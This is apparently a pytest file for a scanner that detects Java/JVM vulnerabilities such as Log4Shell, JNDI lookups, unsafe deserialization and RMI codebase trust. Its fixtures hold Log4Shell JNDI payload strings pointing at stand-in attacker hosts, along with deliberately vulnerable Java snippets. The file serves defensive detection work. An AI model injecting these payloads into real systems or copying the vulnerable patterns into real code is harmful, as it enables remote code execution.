"""Tests for scripts/lib/java_jvm_patterns.py.

Pattern-coverage tests for the Wave-26 distill-round-12 Java / JVM / JNDI
catalogue (6 JVM-runtime-specific anti-patterns covering Log4Shell,
JNDI lookup, native deserialization, reflective class load, vulnerable
Log4j version pin, and RMI codebase trust). Each rule has at least one
positive test exercising the canary AND at least one negative test
exercising the carve-out or context filter.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import java_jvm_patterns as jjp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_every_advertised_rule() -> None:
    """RULES must cover all 6 documented rule IDs in stable order."""
    assert isinstance(jjp.RULES, tuple)
    rule_ids = {r.id for r in jjp.RULES}
    expected = {
        "log4j-jndi-lookup-expansion-in-input",
        "initialcontext-lookup-untrusted-input",
        "objectinputstream-readobject-untrusted-bytes",
        "class-forname-untrusted-input",
        "log4j-core-vulnerable-version-pin",
        "rmi-registry-attacker-reachable-codebase",
    }
    assert expected == rule_ids
    assert len(jjp.RULES) == 6


def test_every_rule_has_valid_owasp_and_severity() -> None:
    """Every rule maps to an ASI- OWASP tag and a known severity tier."""
    for rule in jjp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors the shape used by sibling pattern modules."""
    f = jjp.Finding(
        rule_id="r",
        line=1,
        column=2,
        matched_text="m",
        severity="HIGH",
        description="d",
        owasp_asi="ASI-01",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-01"


def test_empty_text_returns_empty_findings() -> None:
    """Empty input must short-circuit to []."""
    assert jjp.scan_text("") == []


def test_findings_sorted_by_line_then_column() -> None:
    """Ordering must be deterministic — (line, col, rule_id)."""
    src = (
        # Line 1 — Log4Shell placeholder
        'logger.info("ua=" + ua + " - ${jndi:ldap://attacker.tld/a}");\n'
        # Line 2 — Class.forName from input
        'Class<?> c = Class.forName(req.getParameter("handler"));\n'
    )
    findings = jjp.scan_text(src)
    assert len(findings) >= 2
    for i in range(len(findings) - 1):
        assert (findings[i].line, findings[i].column) <= (
            findings[i + 1].line,
            findings[i + 1].column,
        )


def _hits(rule_id: str, text: str) -> list[jjp.Finding]:
    return [f for f in jjp.scan_text(text) if f.rule_id == rule_id]


# ---------- J1 : log4j-jndi-lookup-expansion-in-input --------------------


def test_j1_log4shell_ldap_payload_flags() -> None:
    """Canonical `${jndi:ldap://...}` payload string → CRITICAL hit."""
    src = 'String ua = req.getHeader("User-Agent"); // ${jndi:ldap://attacker.tld/a}\n'
    hits = _hits("log4j-jndi-lookup-expansion-in-input", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_j1_log4shell_rmi_payload_flags() -> None:
    """`${jndi:rmi://...}` variant — alternate transport, still flagged."""
    src = 'logger.warn("payload=${jndi:rmi://evil.example/Exploit}");\n'
    assert _hits("log4j-jndi-lookup-expansion-in-input", src)


def test_j1_plain_dollar_brace_not_flagged() -> None:
    """A plain `${env.VAR}` placeholder must not match J1 (no jndi: scheme)."""
    src = 'String home = "${env.HOME}/data";\n'
    assert not _hits("log4j-jndi-lookup-expansion-in-input", src)


def test_j1_unclosed_jndi_placeholder_not_flagged() -> None:
    """`${jndi:ldap://...` without a closing brace must NOT match."""
    src = 'String s = "${jndi:ldap://evil/a";  // typo, no closing }\n'
    assert not _hits("log4j-jndi-lookup-expansion-in-input", src)


# ---------- J2 : initialcontext-lookup-untrusted-input -------------------


def test_j2_initialcontext_chained_ctor_flags() -> None:
    """`new InitialContext().lookup(req.X)` → CRITICAL hit."""
    src = 'Object o = new InitialContext().lookup(req.getParameter("dn"));\n'
    hits = _hits("initialcontext-lookup-untrusted-input", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_j2_initialdircontext_chained_with_env_arg_flags() -> None:
    """`new InitialDirContext(env).lookup(req.X)` → CRITICAL hit."""
    src = 'Object o = new InitialDirContext(env).lookup(req.getParameter("ref"));\n'
    assert _hits("initialcontext-lookup-untrusted-input", src)


def test_j2_static_constant_lookup_not_flagged() -> None:
    """Constant `java:comp/env/...` arg → no request-source, no hit."""
    src = 'DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/MyDS");\n'
    assert not _hits("initialcontext-lookup-untrusted-input", src)


def test_j2_non_context_lookup_method_not_flagged() -> None:
    """`logger.lookup(...)` on a non-Context type → no hit."""
    src = 'String msg = logger.lookup(req.getParameter("k"));\n'
    assert not _hits("initialcontext-lookup-untrusted-input", src)


# ---------- J3 : objectinputstream-readobject-untrusted-bytes ------------


def test_j3_chained_ois_readobject_flags() -> None:
    """`new ObjectInputStream(...).readObject()` chained → CRITICAL hit."""
    src = 'MyDto dto = (MyDto) new ObjectInputStream(req.getInputStream()).readObject();\n'
    hits = _hits("objectinputstream-readobject-untrusted-bytes", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_j3_split_declaration_then_readobject_flags() -> None:
    """Split form `ois = new OIS(...); ois.readObject()` still matches via lazy bridge."""
    src = (
        "ObjectInputStream ois = new ObjectInputStream(request.getInputStream());\n"
        "MyDto dto = (MyDto) ois.readObject();\n"
    )
    assert _hits("objectinputstream-readobject-untrusted-bytes", src)


def test_j3_setobjectinputfilter_window_suppresses() -> None:
    """JEP-290 filter applied nearby → finding suppressed."""
    src = (
        "ObjectInputStream ois = new ObjectInputStream(req.getInputStream());\n"
        "ois.setObjectInputFilter(MyAllowlist.create());\n"
        "MyDto dto = (MyDto) ois.readObject();\n"
    )
    assert not _hits("objectinputstream-readobject-untrusted-bytes", src)


def test_j3_no_readobject_call_not_flagged() -> None:
    """OIS constructed but never `.readObject()`d → no hit."""
    src = "ObjectInputStream ois = new ObjectInputStream(req.getInputStream());\n"
    assert not _hits("objectinputstream-readobject-untrusted-bytes", src)


# ---------- J4 : class-forname-untrusted-input ---------------------------


def test_j4_class_forname_from_request_flags() -> None:
    """`Class.forName(req.getParameter(...))` → HIGH hit."""
    src = 'Class<?> c = Class.forName(req.getParameter("handler"));\n'
    hits = _hits("class-forname-untrusted-input", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_j4_class_forname_from_system_property_flags() -> None:
    """`Class.forName(System.getProperty(...))` → HIGH hit."""
    src = 'Class<?> driver = Class.forName(System.getProperty("db.driver"));\n'
    assert _hits("class-forname-untrusted-input", src)


def test_j4_class_forname_constant_literal_not_flagged() -> None:
    """JDBC-driver bootstrap with a constant literal → no hit (FP-suppressed)."""
    src = 'Class.forName("org.postgresql.Driver");\n'
    assert not _hits("class-forname-untrusted-input", src)


def test_j4_class_forname_local_variable_not_flagged() -> None:
    """`Class.forName(localVar)` without a recognised user-source → no hit."""
    src = (
        "String driverName = config.getDriver();\n"
        "Class.forName(driverName);\n"
    )
    assert not _hits("class-forname-untrusted-input", src)


# ---------- J5 : log4j-core-vulnerable-version-pin -----------------------


def test_j5_gradle_log4j_core_2_14_1_flags() -> None:
    """Gradle coord `org.apache.logging.log4j:log4j-core:2.14.1` → CRITICAL hit."""
    src = "implementation 'org.apache.logging.log4j:log4j-core:2.14.1'\n"
    hits = _hits("log4j-core-vulnerable-version-pin", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_j5_log4j_api_2_15_0_flags() -> None:
    """log4j-api 2.15.0 (also vulnerable) → CRITICAL hit."""
    src = "compile 'org.apache.logging.log4j:log4j-api:2.15.0'\n"
    assert _hits("log4j-core-vulnerable-version-pin", src)


def test_j5_formatmsgnolookups_mitigation_suppresses() -> None:
    """Same-file mitigation `log4j2.formatMsgNoLookups=true` → suppressed."""
    src = (
        "implementation 'org.apache.logging.log4j:log4j-core:2.14.1'\n"
        "systemProperty 'log4j2.formatMsgNoLookups', 'true'\n"
        "// resolves to: log4j2.formatMsgNoLookups=true\n"
    )
    assert not _hits("log4j-core-vulnerable-version-pin", src)


def test_j5_log4j_2_17_0_not_flagged() -> None:
    """2.17.0 is the fix line — must NOT match the 2.0–2.16 range."""
    src = "implementation 'org.apache.logging.log4j:log4j-core:2.17.0'\n"
    assert not _hits("log4j-core-vulnerable-version-pin", src)


def test_j5_log4j_1_x_not_flagged() -> None:
    """log4j-1.x has different CVE class — must NOT match (regex scopes to 2.x)."""
    src = "implementation 'org.apache.logging.log4j:log4j-core:1.2.17'\n"
    assert not _hits("log4j-core-vulnerable-version-pin", src)


# ---------- J6 : rmi-registry-attacker-reachable-codebase ----------------


def test_j6_create_registry_with_codebase_flip_flags() -> None:
    """`useCodebaseOnly=false` + `createRegistry(...)` → HIGH hit."""
    src = (
        'System.setProperty("java.rmi.server.useCodebaseOnly", "false");\n'
        "Registry r = LocateRegistry.createRegistry(1099);\n"
        'r.rebind("Service", new ServiceImpl());\n'
    )
    hits = _hits("rmi-registry-attacker-reachable-codebase", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_j6_naming_rebind_with_codebase_flip_flags() -> None:
    """`Naming.rebind` is a covered RMI primitive when codebase trust is flipped."""
    src = (
        'System.setProperty("java.rmi.server.useCodebaseOnly", "false");\n'
        'Naming.rebind("rmi://hostname:1099/Service", new ServiceImpl());\n'
    )
    assert _hits("rmi-registry-attacker-reachable-codebase", src)


def test_j6_no_codebase_flip_not_flagged() -> None:
    """Default `useCodebaseOnly=true` (no flip in file) → no hit."""
    src = (
        "Registry r = LocateRegistry.createRegistry(1099);\n"
        'r.rebind("Service", new ServiceImpl());\n'
    )
    assert not _hits("rmi-registry-attacker-reachable-codebase", src)


def test_j6_loopback_bind_window_suppresses() -> None:
    """Loopback bind nearby → down-rated, no hit."""
    src = (
        'System.setProperty("java.rmi.server.useCodebaseOnly", "false");\n'
        'InetAddress lo = InetAddress.getLoopback();\n'
        "Registry r = LocateRegistry.createRegistry(1099);\n"
    )
    assert not _hits("rmi-registry-attacker-reachable-codebase", src)
